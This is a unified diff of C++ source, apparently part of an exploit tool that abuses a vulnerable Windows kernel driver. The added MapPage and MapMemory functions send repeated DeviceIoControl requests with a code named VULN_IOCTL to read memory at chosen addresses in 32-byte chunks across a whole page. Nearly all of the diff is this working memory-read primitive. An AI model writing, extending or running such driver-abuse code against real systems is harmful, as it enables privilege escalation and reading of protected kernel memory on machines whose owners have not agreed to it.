@@ -27,9 +27,11 @@ enum OFFSET
 #pragma pack (push, 1)
 
 struct MapIoCmd {
-	DWORD64 address;
+	DWORD address;
+	char pad[4];
 	DWORD chunk_size;
 	DWORD chunk_num;
+	char pad2[0x100 - 0x10];
 };
 #pragma pack (pop)
 
@@ -53,30 +55,100 @@ HANDLE OpenDevice(const char* device_symbolic_link)
 	return device_handle;
 }
 
-uint8_t* MapMemory(HANDLE device, MapIoCmd* input_buf)
+uint8_t* MapPage(HANDLE device, DWORD address)
 {
-	DWORD bytes_returned = 0;
+	DWORD dwDataSizeToRead = 0x4; // Size of data to read (in chunks), in bytes (1, 2, 4); 1 = movsb (BYTE), 2 = movsw (WORD), 4 = movsd (DWORD)
+	DWORD dwAmountOfDataToRead = 8; // Amount of data (in chunks) to read
+	DWORD dwBytesReturned = 0; // number of bytes returned from the DeviceIoControl request
 
-	LPVOID out_buf = VirtualAlloc((LPVOID)0x42000000, BUFF_SIZE+0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	// allocate memory for the DeviceIoControl lpInBuffer & lpOutBuffer buffers
+	auto lpInBuffer = new MapIoCmd;
+	uint8_t* lpOutBuffer = new uint8_t[0x100];
+	auto thepage = new uint8_t[0x1000];
 
-	auto result = DeviceIoControl(
-		device,
-		VULN_IOCTL,
-		input_buf,
-		(DWORD)sizeof(MapIoCmd),
-		out_buf,
-		(DWORD)BUFF_SIZE+0x100,
-		&bytes_returned,
-		(LPOVERLAPPED)NULL);
 
-	if (!result)
+	for (uint32_t offset = 0; offset < 0x1000; offset += 32)
 	{
-		std::cout << "IOCTL GetLastError " << GetLastError() << std::endl;
-		VirtualFree(out_buf, BUFF_SIZE, MEM_RELEASE);
-		return NULL;
+		lpInBuffer->address = address + offset;
+
+		lpInBuffer->chunk_size = dwDataSizeToRead;
+		lpInBuffer->chunk_num = dwAmountOfDataToRead;
+
+		bool success = DeviceIoControl(
+			device,
+			VULN_IOCTL,
+			lpInBuffer,
+			0x10,
+			lpOutBuffer,
+			0x40,
+			&dwBytesReturned,
+			nullptr);
+
+
+		if (!success)
+		{
+			// memset(thepage + offset, 0x00, 32);
+			continue;
+		}
+		else
+		{
+			memcpy(thepage + offset, lpOutBuffer, 32);
+			//std::cout << "MAPPING SUCCESS \n";
+		}
 	}
 
-	return (uint8_t*)out_buf;
+	delete lpInBuffer;
+
+	return thepage;
+}
+
+uint8_t* MapMemory(HANDLE device, DWORD address)
+{
+    DWORD dwDataSizeToRead = 0x4; // Size of data to read (in chunks), in bytes (1, 2, 4); 1 = movsb (BYTE), 2 = movsw (WORD), 4 = movsd (DWORD)
+    DWORD dwAmountOfDataToRead = 8; // Amount of data (in chunks) to read
+    DWORD dwBytesReturned = 0; // number of bytes returned from the DeviceIoControl request
+
+    // allocate memory for the DeviceIoControl lpInBuffer & lpOutBuffer buffers
+	auto lpInBuffer = new MapIoCmd;
+	uint8_t* lpOutBuffer = new uint8_t[0x100];
+
+    if (lpInBuffer == NULL || lpOutBuffer == NULL)
+    {
+        std::cout << "[!] Unable to allocate buffers' memory area. Error code: " << ::GetLastError() << std::endl;
+        return NULL;
+    }
+
+	lpInBuffer->address = address;
+	
+	lpInBuffer->chunk_size = dwDataSizeToRead;
+	lpInBuffer->chunk_num = dwAmountOfDataToRead;
+
+    bool success = DeviceIoControl(
+        device,
+		VULN_IOCTL,
+        lpInBuffer, 
+        0x10,
+        lpOutBuffer, 
+        0x40,
+        &dwBytesReturned,
+        nullptr);
+
+    if (!success)
+    {
+       // std::cout << "[!] Couldn't send IOCTL 0x" << std::hex << VULN_IOCTL
+        //    << " Error code: 0x" << std::hex << ::GetLastError() << std::endl;
+
+
+		// std::cout << "address was 0x" << std::hex << lpInBuffer->address << "\n";
+        return NULL;
+    }
+	else
+	{
+		std::cout << "MAPPING SUCCESS \n";
+	}
+
+	delete lpInBuffer;
+	return lpOutBuffer;
 }
 
 // ### OPTIONS PARSING ###
